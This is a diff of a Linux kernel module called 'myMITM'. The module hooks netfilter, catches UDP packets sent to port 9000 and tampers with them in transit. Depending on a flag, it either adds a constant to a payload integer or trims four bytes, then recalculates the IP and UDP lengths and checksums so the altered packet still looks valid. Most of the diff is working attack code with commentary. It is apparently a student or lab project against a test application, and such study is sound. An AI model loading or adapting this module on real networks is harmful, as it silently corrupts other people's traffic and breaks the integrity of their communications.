@@ -12,24 +12,40 @@
 #include <linux/cdev.h>
 #include <linux/inet.h>
 #define PORT 8080
-#define SUB_SIZE 4
+#define SIZE_INFECTION 4
+#define DATA_INFECTION 10
 //TODO:infect the packet
 MODULE_LICENSE("Dual BSD/GPL");
 static dev_t my_dev = 0;
 static struct cdev *my_cdev = NULL;
 static struct nf_hook_ops nfho;
-static const int infectionMethod=1;        //struct holding set of hook function options
+static const int infectionMethod=0;        //struct holding set of hook function options
 //function to be called by hook
 
+
+/*!@*****************************************************************************
+ *!
+ *! FUNCTION:			 compute_udp_checksum
+ *!
+ *! GENERAL DESCRIPTION: compute the udp checksum
+ *!
+ *! Input:				 iphdr packet,updhdr packet as ipPayload
+ *!
+ *! Output:             udp checksum
+ *!
+ *! ALGORITHM:			The algorithm is base on the following operations:
+ *!                     1.sum the source address,dest address,IPPROTO(tcp,udp,icmp...),udphdr len
+ *!
+ *! ASSUMPTIONS:		none.
+ *! REMARKS:			none.
+ *!
+ *!*****************************************************************************
+ *!@*/
 unsigned short compute_udp_checksum(struct iphdr *pIph, unsigned short *ipPayload)
  {
     register unsigned long sum = 0;
     struct udphdr *udphdrp = (struct udphdr*)(ipPayload);
     unsigned short udpLen = htons(udphdrp->len);
-    //printf("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~udp len=%dn", udpLen);
-    //add sudo gcc -o test main.c list.c sqliteCon.c activeProtocol.c nfqHandle.c structField.c -lnetfilter_queue -lsqlite3 the pseudo header
-    //printf("add pseudo headern");
-    //the source ip
     sum += (pIph->saddr>>16)&0xFFFF;
     sum += (pIph->saddr)&0xFFFF;
     //the dest ip
@@ -65,212 +81,99 @@ unsigned short compute_udp_checksum(struct iphdr *pIph, unsigned short *ipPayloa
    return ((unsigned short)sum == 0x0000)?0xFFFF:(unsigned short)sum;
 }
 
+/*!@*****************************************************************************
+ *!
+ *! FUNCTION:			 infectionByData
+ *!
+ *! GENERAL DESCRIPTION: infection the raw data of the packet
+ *!
+ *! Input:				 socket buffer,udphdr,ihdr,payload
+ *!
+ *! Output:             none.
+ *!
+ *! ALGORITHM:			The algorithm is base on the following operations:
+ *!                     1.change the payload data by mul,div,plus.minus
+ *!
+ *! ASSUMPTIONS:		none.
+ *! REMARKS:			none.
+ *!
+ *!*****************************************************************************
+ *!@*/
 void infectionByData(struct sk_buff *skb,struct udphdr *udph,struct iphdr *iph, unsigned char* payload)
 {
-    //struct udphdr *udph;
-    //struct iphdr *iph;
-    //unsigned char* payload;
-    //printk(KERN_ALERT "myMITM inside hook function after idntify UDP\n");
-		//iph = (struct iphdr *)skb_network_header(skb);
-		//if(iph->protocol==IPPROTO_UDP)
-	    //{
-           printk(KERN_ALERT "myMITM inside hook function after idntify UDP\n");
-          // udph=(struct udphdr*)skb_transport_header(skb);
-           printk("myMITM udph->dest = %d\n",udph->dest);
-           //printk("myMITM udph->source = %d\n",udph->source);
-           printk("myMITM iph->saddr = %x\n",iph->saddr);
-           //printk("myMITM iph->daddr = %x\n",iph->daddr);
 
-           //printk("dest_port = %x\n",udph->dest);
-           //printk("udph->dest = %x\n",udph->dest);
-              payload=skb->data+(iph->ihl * 4)+sizeof(udph);
+    printk(KERN_ALERT "myMITM inside hook function after idntify UDP\n");
+    printk("myMITM udph->dest = %d\n",udph->dest);
+    printk("myMITM iph->saddr = %x\n",iph->saddr);
+    payload=skb->data+(iph->ihl * 4)+sizeof(udph);
+    printk("payload is %d",ntohl(*(((int*)payload)+1)));
 
-			  //printk("myMITM  skb->tail %p\n",skb->tail);
-			/*  for (i=0;i<9;i++)
-			     printk("payload[%d]=%x \n",i,payload[i]);
-			*/
-			printk("payload is %d",*((int*)payload));
-              // change UDP data
-              *((int*)payload+1)+=1;
-              /*
-              for (i=0;i<9;i++)
-              {
-			     payload[i]=payload[i] + 1 ;
-              }*/
-              printk("myMITM change payload\n");
-              /*
-              for (i=0;i<9;i++)
-			     printk("payload[%d]=%x \n",i,payload[i]);
-			     */
-			     printk("payload is %d",*((int*)payload));
+    //------change UDP data,using htonl function to add bigEndian number---------------//
+    //------because the packet sent from java application and java is bigEndian-------//
+    *(((int*)payload)+2)+=htonl(DATA_INFECTION);
 
-}
-
-void infectionBySizeOld(struct sk_buff *skb1,struct udphdr *udph,struct iphdr *iph,struct ethhdr *eth,unsigned char *payload,int payload_len)
-{
-    unsigned char* data;
-    int i=0;
-    __wsum partial;
-
-    //GET NET DEVICE
-
-    unsigned char mac_source_char[ETH_ALEN]={};
-    unsigned char mac_dest_char[ETH_ALEN]={};
-    struct net_device *enp0s3;
-    char addr[ETH_ALEN] = {0x00,0x00,0x00,0x00,0x00,0x00};
-	uint8_t dest_addr[ETH_ALEN];
-	uint8_t source_addr[ETH_ALEN];
-    enp0s3 = dev_get_by_name(&init_net,"enp0s3");
-    memcpy(dest_addr, addr,ETH_ALEN);
-    memcpy(source_addr,addr,ETH_ALEN);
-	/* Skb */
-    struct sk_buff* skb = alloc_skb(ETH_HLEN+payload_len+sizeof(struct udphdr)+sizeof(struct iphdr), GFP_ATOMIC);//allocate a network buffer
-    skb->dev = enp0s3;
-    //dev_hard_start_xmit(skb,lo);
-    //lo->hard_start_xmit=hard_start_xmit(skb,lo);
-    skb->pkt_type = PACKET_OUTGOING;
-    skb->protocol = htons(ETH_P_IP);
-    skb->no_fcs = 1;
-    skb->ip_summed = CHECKSUM_NONE;
-    skb->priority = 0;
-    skb->next = skb->prev = NULL;
-    skb_reserve(skb, ETH_HLEN+sizeof(struct iphdr)+sizeof(struct udphdr));//adjust headroom
-
-    /* Allocate space to data and write it */
-    data = skb_put(skb,payload_len);
-    memcpy(data, payload, payload_len);
-
-    /* UDP header */
-    struct udphdr* udp_hdr = (struct udphdr*)skb_push(skb,sizeof(struct udphdr));
-    udp_hdr->len = htons(payload_len+sizeof(struct udphdr));
-    udp_hdr->source = udph->source;
-    udp_hdr->dest = udph->dest;
-    udp_hdr->check = 0;
-    printk("udp_hdr->len %hu",ntohs(udp_hdr->len));
-    printk("udp_hdr->source %hu",ntohs(udp_hdr->source));
-    printk("udp_hdr->dest %hu",ntohs(udp_hdr->dest));
-
-    /* IP header */
-    struct iphdr* ip_hdr = (struct iphdr*)skb_push(skb,sizeof(struct iphdr));
-    ip_hdr->ihl =iph->ihl;//4*5=20 ip_header_len
-    ip_hdr->version = iph->version; // IPv4u
-    ip_hdr->tos = iph->tos;
-    ip_hdr->tot_len=htons(payload_len+sizeof(struct udphdr)+sizeof(struct iphdr));
-    ip_hdr->id=iph->id;
-    ip_hdr->frag_off = iph->frag_off;
-    ip_hdr->ttl = iph->ttl; // Set a TTL.
-    ip_hdr->protocol = iph->protocol; //  protocol.
-    //ip_hdr->check = iph->check;
-    ip_hdr->saddr = iph->saddr;
-    ip_hdr->daddr = iph->daddr;
-
-
-    printk("ip_hdr->saddr %x",ip_hdr->saddr);
-    printk("ip_hdr->daddr %x",ip_hdr->daddr);
-
-
-
-  /* Mac address */
-    struct ethhdr* eth_hdr = (struct ethhdr*)skb_push(skb, sizeof (struct ethhdr));//add data to the start of a buffer
-    eth_hdr->h_proto = htons(ETH_P_IP);
-    //memcpy(eth_hdr->h_source,skb1->data, ETH_ALEN);
-    //memcpy(eth_hdr->h_dest, skb1->data+6, ETH_ALEN);
-    memcpy(eth_hdr->h_source,dest_addr, ETH_ALEN);
-    memcpy(eth_hdr->h_dest,source_addr, ETH_ALEN);
-    printk("eth_hdr->h_source :");
-    printk("Source MAC=%x:%x:%x:%x:%x:%x\n",eth_hdr->h_source[0],eth_hdr->h_source[1],eth_hdr->h_source[2],eth_hdr->h_source[3],eth_hdr->h_source[4],eth_hdr->h_source[5]);
-    printk("Dest MAC=%x:%x:%x:%x:%x:%x\n",eth_hdr->h_dest[0],eth_hdr->h_dest[1],eth_hdr->h_dest[2],eth_hdr->h_dest[3],eth_hdr->h_dest[4],eth_hdr->h_dest[5]);
-
-  /* caculate checksum */
-    skb->csum=0;
-	skb->csum = skb_checksum(skb, ip_hdr->ihl*4, skb->len-ip_hdr->ihl*4, 0);
-	ip_hdr->check=0;
-	ip_hdr->check = ip_fast_csum((unsigned char*)ip_hdr, ip_hdr->ihl);
-    partial=csum_partial((unsigned char *)udp_hdr,udp_hdr->len,0);
-    udp_hdr->check=0;
-	udp_hdr->check =csum_tcpudp_magic(ip_hdr->saddr, ip_hdr->daddr, /*skb->len-ip_hdr->ihl*4*/udp_hdr->len, IPPROTO_UDP, /*skb->csum*/partial);
-
-     if (dev_queue_xmit(skb)<0)
-      {
-                dev_put(enp0s3);
-                kfree_skb(skb);
-                printk("send packet by skb failed.\n");
-                return;
-      }
-        printk("send packet by skb success.\n");
+    printk("myMITM change payload\n");
+    printk("payload is %d",ntohl(*(((int*)payload)+1)));
 
 }
 
 
-void infectionBySize(struct sk_buff *skb,struct udphdr *udp_hdr,struct iphdr *ip_hdr,int infectionSize)
+/*!@*****************************************************************************
+ *!
+ *! FUNCTION:			 infectionBySize
+ *!
+ *! GENERAL DESCRIPTION: infection the size of the packet
+ *!
+ *! Input:				socket buffer,udphdr,ihdr
+ *!
+ *! Output:             none.
+ *!
+ *! ALGORITHM:			The algorithm is base on the following operations:
+ *!                     1.change the payload size using skb_trim function from <linux/netfilter.h>
+ *!                     2.change the iphdr->tot_len size and udphdr->len size properly
+ *!                     3. compute the checksum of ip and udp headers according to the new length
+ *!
+ *! ASSUMPTIONS:		none.
+ *! REMARKS:			none.
+ *!
+ *!*****************************************************************************
+ *!@*/
+void infectionBySize(struct sk_buff *skb,struct udphdr *udp_hdr,struct iphdr *ip_hdr)
 {
-    __wsum partial;
-     __sum16 oldsum=0;
-     __sum16 sum2=0;
-     //int iphdrlen = ip_hdrlen(skb);
-     //printk("iphdrlen= %d",iphdrlen);
-    unsigned udplen = 0;
-    printk("udphdr len =%d\n",ntohs(udp_hdr->len));
-    printk("ip_hdr->tot_len-iphdr=%d\n",ntohs(ip_hdr->tot_len)-(ip_hdr->ihl*4));
-    printk("size of iphdr %d",sizeof(struct iphdr));
-    printk("skb->len %d",skb->len);
-    printk("iphdr->ihl %d\n",ip_hdr->ihl);
+    skb_trim(skb, skb->len-SIZE_INFECTION);
+    udp_hdr->len=htons(ntohs(udp_hdr->len)-SIZE_INFECTION);
+    ip_hdr->tot_len=htons(ntohs(ip_hdr->tot_len)-SIZE_INFECTION);
 
-    skb_trim(skb, skb->len-infectionSize);
-    //skb->ip_summed=CHECKSUM_COMPLETE;
-     printk("old sk->csum=%d",ntohs(skb->csum));
-     printk("new sk->csum=%d",ntohs(skb_checksum(skb, ip_hdr->ihl*4, skb->len-ip_hdr->ihl*4, 0)));
-     udp_hdr->len=htons(ntohs(udp_hdr->len)-infectionSize);
-     ip_hdr->tot_len=htons(ntohs(ip_hdr->tot_len)-infectionSize);
-     /*if (unlikely(skb_linearize(skb) != 0))
-      {
-        //there is no memory
-        printk("there is no memeory to linear sk_buff");
-        return;
-      }*/
 
-    //skb->ip_summed=CHECKSUM_UNNECESSARY;
-    //ip_hdr->tot_len=htons(ntohs(ip_hdr->tot_len));
-    //udp_hdr->len = htons(ntohs(udp_hdr->len ));
-    oldsum = udp_hdr->check;
-	//udp->check = 0;
-	//udplen = ntohs(ip_hdr->tot_len) - iphdrlen;
-    //skb->csum=0;
-	//ip_hdr->check=0;
-	//udp_hdr->check=0;
-
-    printk("old ip checksum =%d\n",ntohs(ip_hdr->check));
     ip_hdr->check=0;
     ip_hdr->check=ip_fast_csum((unsigned char*)ip_hdr, ip_hdr->ihl);
-	//ip_hdr->check = ip_fast_csum((unsigned char*)ip_hdr, ip_hdr->ihl);
-	printk("new ip checksum =%d\n",ntohs(ip_hdr->check));
-	//udp_hdr->check=0;
-    //partial=csum_partial((unsigned char *)udp_hdr+sizeof(struct udphdr),ntohs(udp_hdr->len)-sizeof(struct udphdr),0);
-	//udp_hdr->check =csum_tcpudp_magic(ip_hdr->saddr, ip_hdr->daddr, /*skb->len-ip_hdr->ihl*4*/ntohs(udp_hdr->len), IPPROTO_UDP, /*skb->csum*/partial);
-	printk("old udp checksum =%x\n",oldsum);
-    printk("new udp checksum=%x\n",compute_udp_checksum(ip_hdr,(unsigned short*)udp_hdr));
-	//printk("new udp checksum =%x\n",csum_tcpudp_magic(ip_hdr->saddr, ip_hdr->daddr, /*skb->len-ip_hdr->ihl*4*/ntohs(udp_hdr->len), IPPROTO_UDP, partial));
 	udp_hdr->check=compute_udp_checksum(ip_hdr,(unsigned short*)udp_hdr);
-	//skb->csum = skb_checksum(skb, ip_hdr->ihl*4, skb->len-ip_hdr->ihl*4, 0);
-
-
-    //ip_hdr->tot_len=htons(ntohs(ip_hdr->tot_len)-infectionSize);
-    //udp_hdr->len = htons(ntohs(udp_hdr->len )-infectionSize);
-    //skb->csum=0;
-	//skb->csum = skb_checksum(skb, ip_hdr->ihl*4, skb->len-ip_hdr->ihl*4, 0);
-	//ip_hdr->check=0;
-	//ip_hdr->check = ip_fast_csum((unsigned char*)ip_hdr, ip_hdr->ihl);
-    //partial=csum_partial((unsigned char *)udp_hdr,udp_hdr->len,0);
-    //udp_hdr->check=0;
-	//udp_hdr->check =csum_tcpudp_magic(ip_hdr->saddr, ip_hdr->daddr, /*skb->len-ip_hdr->ihl*4*/udp_hdr->len, IPPROTO_UDP, /*skb->csum*/partial);
-
 
 }
 
+
+/*!@*****************************************************************************
+ *!
+ *! FUNCTION:			 hook_func
+ *!
+ *! GENERAL DESCRIPTION: check if the packet is the packet to infect and choose infection
+ *!                      method
+ *!
+ *! Input:				constant prototype(I'm using only the socket buffer-skb)
+ *!
+ *! ALGORITHM:			The algorithm is base on the following operations:
+ *!                     1.extract ethdr, iphdr and udphdr
+ *!                     2.check if the packet id the packet to infect by port and ip
+ *!                     3.choose infection method and infect the packet
+ *!
+ *! ASSUMPTIONS:		none.
+ *! REMARKS:			none.
+ *!
+ *!*****************************************************************************
+ *!@*/
 unsigned int hook_func(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
 {
-    //unsigned char* dest_port="\x50\x50";
-    //unsigned char* dest_ip="\x7f\x00\x00\x01";
+
     unsigned char *paylaod_data=NULL;
     struct udphdr *udph;
     struct iphdr *iph;
@@ -278,8 +181,7 @@ unsigned int hook_func(void *priv, struct sk_buff *skb, const struct nf_hook_sta
     int payload_len=0;
     unsigned char *tail;
     struct sk_buff *new_sk_buff;
-    int infectionSize=SUB_SIZE;
-    //printk(KERN_ALERT "myMITM inside hook function\n");
+    int infectionSize=SIZE_INFECTION;
     if(skb)
     {
         eth=(struct ethhdr *)skb_mac_header(skb);
@@ -291,14 +193,10 @@ unsigned int hook_func(void *priv, struct sk_buff *skb, const struct nf_hook_sta
                 udph=(struct udphdr*)skb_transport_header(skb);
                 if(udph->dest==htons(9000))
                 {
-                    //tail=skb_tail_pointer(skb);
-                    //paylaod_data=(unsigned char*)udph+sizeof(struct udphdr);//skb->data+(iph->ihl * 4)+sizeof(udph);
-                    //payload_len=(unsigned char*)tail-(unsigned char*)udph-sizeof(struct udphdr);
-                    //payload_len-=SUB_SIZE
                     switch(infectionMethod)
                     {
                        case 0:infectionByData(skb,udph,iph,paylaod_data);break;
-                       case 1:infectionBySize(skb,udph,iph,infectionSize);break;
+                       case 1:infectionBySize(skb,udph,iph);break;
                        //case 1:infectionBySize(skb,udph,iph,eth,paylaod_data,payload_len);break;//if its to change the size
                                                                                                     //i want to drop the old sk_buff and send the new(infected) sk_buff
                     }
@@ -310,7 +208,25 @@ unsigned int hook_func(void *priv, struct sk_buff *skb, const struct nf_hook_sta
 	return NF_ACCEPT; //this will accept the packet
 }
 
-//Called when module loaded using 'insmod'
+
+
+/*!@*****************************************************************************
+ *!
+ *! FUNCTION:			 __init nf_hook_init
+ *!
+ *! GENERAL DESCRIPTION: module function subscribed on Network Card device
+ *!
+ *! Input:				none.
+ *!
+ *! ALGORITHM:			The algorithm is base on the following operations:
+ *!                     1.subscribing on Network Card device by module code struct
+ *!
+ *! ASSUMPTIONS:		none.
+ *! REMARKS:			Called when module loaded using 'insmod'
+ *!
+ *!*****************************************************************************
+ *!@*/
+
 static int __init nf_hook_init(void)
 {
   int ret = 0;
